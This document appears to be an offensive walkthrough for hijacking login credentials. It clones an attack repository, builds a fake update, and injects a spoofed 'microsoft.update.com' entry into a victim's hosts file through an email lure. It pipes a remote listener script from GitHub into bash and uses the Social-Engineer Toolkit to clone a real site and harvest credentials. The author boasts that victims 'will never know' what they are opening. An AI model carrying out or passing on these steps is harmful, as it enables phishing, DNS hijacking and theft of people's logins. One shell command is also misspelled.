-  [curl](https://curl.haxx.se/)

-  [apache2](https://httpd.apache.org/docs/2.4/howto/public_html.html)

-  [SOCIAL-ENGINEER TOOLKIT (SET)](https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/)

-  [Python](https://www.python.org/)

-  [Kali Linux](https://www.kali.org/target="_blank")

# Exploit steps:
- PWN OS HTTPS hijacking

1. - Preparing a fake update for the victim:
```bash
git clone https://github.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials.git
cd SSTC-HTTPS-hijack-login-credentials/Attacker/sh1mazu_https_fake
bash sh1m@zu.sh
[1]
     enter
```

2. - Preparing your hosts-file for exploiting of the victim:
     
     // fakesite.login.com

```bash
cd SSTC-HTTPS-hijack-login-credentials/Attacker/hosts_fake_inject

bash fakehost.sh
     
     # NOTE: You should set up your Network setup to STATIC!
     
     # For example:
     # with IP 10.10.10.100 or 192.168.1.100
     # Or it'd depend from the local network in leyar2
     # WARNING: The host_injector is working only with these IP's from A class of networks
     //10.10.10.100// and //192.168.1.100//
     
     type the attacker IP 10.10.10.100 # or 192.168.1.100
     
     type the fake domain microsoft.update.com
     
     enter
```
3. - Sending an email or an extra lure on your victim to injecting her `hosts` file.


- **conclusion** and ***NOTE:*** This is the DNS attack which using an injection method against the victim hosts file.
        In that way, the victim will never know what actually opening on the browser when clicking on your link. The idea is         when the victim clicks on your link and opens the browser is not to see your IP
        and to see what you want to do it. When the victim opens your `fake domain` no matter what protocol is using `HTTP`         or `HTTPS`. The victim will never understand what actually is hidden behind this domain. ;)
```
Ð¢hat's the hardest part ;)
I will give you a decision soon, but until then you should create your own!
There is no easy things in this world. ;)
```
4. - Listening for victim visiting

```bash
     curl -s https://raw.githubusercontent.com/nu11secur1ty/SSTC-HTTPS-hijack-login-credentials/master/Attacker/Hijack-HTTPS-Listener/kazkuvgluvutu.sh | bash
```

5. - After exploiting the victim you should ***Stop Apache2***
```bash
systemct stop apache2.service
```
-------------------------------------------------------------

***SECOND PART***

1. - setoolkit cloning of real website
```bash
setoolkit
1) Social-Engineering Attacks
     set>1
     enter
2) Website Attack Vectors
     set>2
     enter
3) Credential Harvester Attack Method
     set:webattack>3
     enter
2) Site Cloner
     set:webattack>2
     enter
set:webattack> IP address for the POST back in Harvester/Tabnabbing [10.10.10.100]:_your_local_layer2_IP_
     enter
[-] Example: http://www.thisisafakesite.com
set:webattack> Enter the url to clone: _your_site_
     enter
     enter
```
2. - Sending a hijack email of the victim.
```bash

```
